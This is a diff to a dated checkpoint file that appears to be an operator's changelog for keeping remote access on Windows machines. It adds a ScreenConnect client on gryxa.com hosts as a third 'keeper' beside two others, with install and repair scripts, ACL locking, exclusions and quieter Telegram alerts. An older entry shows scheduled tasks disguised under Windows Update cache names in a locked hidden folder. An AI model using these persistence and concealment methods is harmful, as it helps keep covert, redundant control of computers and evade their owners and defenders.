@@ -1,5 +1,13 @@
 # CHECKPOINT — 2026-08-03
 
+## O35 / M25 / L14 / T15 / S7 — gryxa keep + quiet Telegram
+- Gryxa ScreenConnect as 3rd keeper beside sevrz primary+alt:
+  FP `9908198e668e4750` | MSI `ui.gryxa.com/...Guest` | relay `update.gryxa.com`
+  Install/repair in own.cmd [5b] + own_mon [G2]; secure/ACL/exclusions S7.
+- Quiet TG: skip compact HB when prim+gryxa OK and foreign=0; unhealthy HB
+  max every 360m; DOWN skipped if already Running; longer FAIL/DOWN suppress.
+- Compact digest: `sev=` / `gry=` / `t=` (shorter). Expect Source O35.
+
 ## O34 / M24 / L13 / T14 — schtasks via BOOT TR (like WucacheOwn)
 O33 still had verify_taskA-D_FAIL with root names. Root cause: Task To Run
 pointed at ACL-locked `ProgramData\...\ .wucache` (early own_secure LockDir).
